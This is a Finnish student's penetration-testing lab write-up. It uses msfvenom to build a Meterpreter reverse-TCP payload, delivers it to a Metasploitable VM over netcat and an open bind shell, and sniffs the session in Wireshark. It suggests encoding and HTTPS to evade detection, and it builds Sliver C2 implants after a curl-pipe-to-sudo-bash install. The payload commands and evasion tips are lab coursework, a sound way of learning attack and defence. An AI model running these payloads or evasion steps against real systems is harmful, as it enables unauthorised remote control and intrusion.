# Harjoitus 6: Koita simpukoita

Kurssi: https://terokarvinen.com/tunkeutumistestaus/ \
Tehtävänanto: https://terokarvinen.com/tunkeutumistestaus/#h6-koita-simpukoita

## a) Venom. Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.

MSFvenom on Metasploit-viitekehykseen kuuluva komentorivityökalu hyötykuormien generoimiseen. Se on hyödyllinen etenkin post-exploitation vaiheessa shellin saamiseksi kohteeseen.

Seurasin artikkelia https://www.beyondtrust.com/blog/entry/how-to-use-metasploit-for-command-control, meterpreter reverse shellin luomiseksi.

Kohteena käytän metasploitablea (192.168.56.101) ja hyökkäyskoneena kali (192.168.56.1).

Payloadin luomiseksi käytin seuraavio valintoja:
* `-p linux/x86/meterpreter/reverse_tcp`: Payloadiksi valitaan x86 arkkitehtuurin linuxiin tarkoitettu meterpeter reverse tcp -shell, eli meterpreter ohtaa kohteen koneelta yhteyden hyökkääjään.
* `LHOST=192.168.56.1 LPORT=4444`: Hyökkääjän IP ja portti, johon meterpreter soittaa.
* `-f elf`: Formatiksi valitaan "elf", eli msfvenom tekee payloadista linux binäärin.
* `-o meterpreter`: Luodun binäärin nimeksi annetaan "meterpreter".

```
┌──(lassi㉿lika)-[~/simpukat]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o meterpreter
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: meterpreter
```

En antanut msfvenomille kohteen alustaa `--platform` tai arkkitehtuuria `-a`, mutta msfvenom osasi valita ne käytetyn hyötykuorman perusteella.

Seuraavaksi asetin hyökkäyskoneella metasploitin kuuntelemaan reverse shelliä uudessa ikkunassa. Asetin exploitiksi `multi/handler` payloadin vastaanottamiseksi ja määritin payloadiksi saman mitä käytettiin msfvenomissa, jotta metasploit tietää mitä on tulossa.

```
┌──(lassi㉿lika)-[~/simpukat]
└─$ sudo msfconsole           
...
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
```

Pakollisena payload-asetuksena metasploit tarvitsee LHOST:n ja LPORT:n. Näiden tulee olla samat kuin msfvenomissa.

<img width="781" height="316" alt="image" src="https://github.com/user-attachments/assets/3d5ac0e9-607d-456d-9ee0-e6deb66e88e6" />

LPORT oli oikein, joten asetin LHOST:n.

```
msf exploit(multi/handler) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
```

Laitoin metasploitin kuuntelemaan yhteyttä. Optio `-j` ajaa prosessin taustalla.

```
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.56.1:4444
```

Tässä kohtaa, kun binääri piti saada kohteeseen ja ajaa niin tajusin, että olisi ollut helpompi käyttää suoraan komentoriviltä ajettavaa payloadia meterpreterin bind-shellin kautta. Kaikki oli kuitenkin jo muuten valmista, niin päätin siirtää meterpreter payloadin metasploitableen netcatin avulla.

Yhdistin metasploitablen bind-shelliin netcatin avulla ja laitoin netcatin kuuntelemaan uuteen porttin, ja ohjaamaan outputin tiedostoon meterpreter.

```
┌──(lassi㉿lika)-[~/simpukat]
└─$ nc 192.168.56.101 1524
root@metasploitable:/# nc -l -p 5678 > meterpeter
```

Toisessa ikkunassa lähetin meterpreter tiedoston avaamaani netcat porttiin.

```
┌──(lassi㉿lika)-[~/simpukat]
└─$ cat meterpreter | nc 192.168.56.101 5678 
```

Lopetin muutaman sekunnin päästä yhteydet kummastakin päästä, yhdistin jälleen bind shelliin ja käynnistin meterpreter-ohjelman.

```
root@metasploitable:/# cat meterpeter
ELFT44 �Jj
^1���SCSj�f��̀�[h��8h\��jfXPQW��C̀��yNt=h�Xjj��1�̀��y��'������
                                                           ��
                                                             �}̀��x[�ᙲf�̀��x����̀root@metasploitable:/#
root@metasploitable:/# ./meterpeter
bash: ./meterpeter: Permission denied
root@metasploitable:/# chmod u+x meterpeter
root@metasploitable:/# ./meterpeter
```

Tässä kohtaa metasploit-ikkunaan tuli ilmoitus avatusta meterpreter sessiosta.

```
[*] Sending stage (1062760 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.101:37601) at 2026-05-02 18:47:41 +0300
```

Lopuksi vielä avasin session ja varmistin, että yhteys toimii.

<img width="533" height="201" alt="image" src="https://github.com/user-attachments/assets/86182364-2427-4379-8960-d8e495354f16" />

Kaikki näytti oikealta, joten meterpreter reverse shell toimi oikein.

## b) Snif venom! Tarkastele ja analysoi msfvenomin muodostamaa reverse shell -yhteyttä. Käytä snifferiä, kuten Wireshark. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa? Millä muutoksilla tunnistamista voi vaikeuttaa?

Reverse shell yhteys on nyt aktiivinen ja käynnistin wiresharkin, `wireshark`. Valitsin kaapattavaksi verkkoliitännäksi kalin ja metasploitablen välisen virtuaaliverkon vboxnet0.

Filtteröin vielä wiresharkin näyttämään vain tcp-protokollan.

<img width="1543" height="482" alt="image" src="https://github.com/user-attachments/assets/f28ce57a-88f9-4e48-b7bd-53652bbac248" />

Kuvan paketit 4-8 ovat meterpreter komennon `sysinfo` aiheittamia, mutta muut ovat meterpreter yhteyden automaattisesti luomia.

Tunnistuksen kannalta olennaista on meterpreterin oletusportti 4444, joka toimii kuuntelevana porttina hyökkääjän koneella. Lisäksi todennäköisesti noin 60 sekunnin välein tapahtuva keepalive, sekä PSH-ACK, PSH-ACK, ACK kaava. Pakettien koko auttaa myös reverse shellin tunnistamisessa (https://www.cyberbit.com/endpoint-security/detecting-reverse-shell-with-machine-learning/).

Harjaantumattomalle silmällä itse TCP-pakettien sisällöstä ei löytynyt paljoaakaan tunnistettavaa tietoa.

<img width="1919" height="712" alt="image" src="https://github.com/user-attachments/assets/9b67fd9a-7c7b-4f0d-83b7-4cf308fee2f1" />

Käyttämäni meterpreter reverse tcp payloadin liikenne ei ole salattua, mutta se lähetetään kuitenkin binäärinä. Olen suhteellisen varma, että tälle liikenteelle on mahdollista rakentaa tunnistus.

Tunnistukselta välttämiseksi aloittaisin luomalla msfvenomilla uuden payloadin, mutta enkoodattuna `-e` useaan kertaan `-i`. Tämä obfuskoi ohjelman ja tekee sen havaitsemisesta kohdekoneella vaikeamman. (https://medium.com/@mahmoudmsallam2002/persistence-technique-and-detection-with-splunk-f174db7bdb94). Käyttäisin reverse tcp payloadin sijasta esimerkiksi reverse https payloadia, jolloin liikenteen sisältö on salattua. Oletusportin 4444 vaihtaminen voi myös auttaa tunnistuksen välttämisessä.

## c) Hello, Sliver. Näytä esimerkki http-yhteydestä Sliverillä.

Sliver on Command and Control (C2) viitekehys, joka koostuu sliver-serveristä ja sliver-clientista. Sliver-server on palvelin, johon clientit ja kohteet yhdistävät. Sliver-client on operaattorin, eli hyökkääjän komentorivityökalu, jolla ohjataan palvelinta ja kohteita. Implantit ovat sliverin payloadeja, jotka yhdistävät sliver-serveriin. (https://sliver.sh/tutorials/?name=1+-+Getting+Started)

Asensin sliverin käyttäen sliverin GitHubissa ollutta asennus-skriptiä, `curl https://sliver.sh/install|sudo bash`.

Käynnistin sliverin ja käytin palvelimena ensimmäistä vaihtoehtoa.

<img width="343" height="126" alt="image" src="https://github.com/user-attachments/assets/94b6457d-02f9-4dbc-89b1-6adc54c5e334" />

Pääsin tämän jälkeen sliveriin.

<img width="525" height="314" alt="image" src="https://github.com/user-attachments/assets/a2472f3f-b803-4c6f-9e2b-284822849994" />

`generate`-komennolla tein uuden implantin. 

<img width="701" height="115" alt="image" src="https://github.com/user-attachments/assets/952d7ff4-9b4b-40d4-9d4d-e484ac094cef" />

Lähetin implantin metasploitableen.

<img width="413" height="48" alt="image" src="https://github.com/user-attachments/assets/474b1252-8580-4e46-bc1a-a7cafcb726d4" />

<img width="386" height="38" alt="image" src="https://github.com/user-attachments/assets/796de5c5-1086-49d3-aae4-dce8954556ad" />

Yritin ajaa binäärin, mutta se ei onnistunut väärän arkkitehtuurin vuoksi.

```
root@metasploitable:/# chmod u+x implant
root@metasploitable:/# ./implant
bash: ./implant: cannot execute binary file
root@metasploitable:/# file implant
implant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
root@metasploitable:/# uname -m
i686
```

Metasploitablen arkkitehtuuri on 32-bittinen, joten lähdin kokeilemaan sliverin linux/386. Kuvassa sliverin tuetut arkkitehtuurit (https://sliver.sh/docs/?name=Payload+Compatibility).

<img width="862" height="416" alt="image" src="https://github.com/user-attachments/assets/80bf33b6-a0c1-4545-84bc-8191d4fa1500" />

Loin uuden binäärin, tällä kertaa toisella arkkitehtuurilla. Arkkitehtuuri ei ole sama kuin metasploitablessa, mutta ainoa linuxin 32-bittinen, joten testasin vielä sitä.

```
[127.0.0.1] sliver > generate --http 192.168.56.1 --os linux --format elf --arch 386

[*] Generating new linux/386 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 2m11s
[*] Implant saved to /home/lassi/Downloads/TAN_RATE
```

Siirsin implantin metasploitableen, kuten aiemmat ja ajoin sen.

```
root@metasploitable:/# ./implant
```

Binääri ajettiin, mutta mitään ei tapahtunut sliverissä. Tarkastin vielä `sessions` komennolla.

<img width="276" height="67" alt="image" src="https://github.com/user-attachments/assets/934d0ea9-a290-4937-9dac-421ab9452d2c" />

Käynnistin vielä sliverin http- ja https-kuuntelijat ja ajoin implantin uudestaan, mutta siltikään mitään ei tapahtunut.

```
[127.0.0.1] sliver > http --lhost 192.168.56.1 --lport 80

[*] Starting HTTP :80 listener ...
[*] Successfully started job #3

[127.0.0.1] sliver > https --lhost 192.168.56.1 --lport 443

[*] Starting HTTPS :443 listener ...
[*] Successfully started job #4

[127.0.0.1] sliver > jobs

 ID   Name    Protocol   Port   Domains 
==== ======= ========== ====== =========
 3    http    tcp        80             
 4    https   tcp        443            
```

Yrittäessäni ajaa implantia metasploitablessa huomasin, että se ei luonut prosessia.

```
root@metasploitable:/# ./implant
root@metasploitable:/# ps aux |grep implant
root      5100  0.0  0.0   1784   532 ?        R    10:55   0:00 grep implant
```

Tarkastin vielä, että implantti ei ollut muuttunut matkalla vertaamalla niiden tiisteitä.

```
┌──(lassi㉿lika)-[~/Downloads]
└─$ sha256sum TAN_RATE
5dda782d62eca4fe07b2bf4e85790db1905f5e3367b637df8bcfd5ca846e13b3  TAN_RATE

root@metasploitable:/# sha256sum implant
5dda782d62eca4fe07b2bf4e85790db1905f5e3367b637df8bcfd5ca846e13b3  implant
```

Nämä olivat samat, joten ongelmana oli todennäköisesti metasploitablen ei-tuettu arkkitehtuuri i686. On myös mahdollista, että localhost-osoitteessa oleva sliver-server ei saa otettua yhteyttä vastaan, vaikka käynnistin kuuntelijan oikeassa osoitteessa.

Jotta voin nämä kummatkin vaihtoehdot eliminoida samalla, niin päätin ajaa implantin suoraan Kalissa. Tätä varten loin vielä kerran uuden implantin, `generate --http localhost --os linux --format elf`.
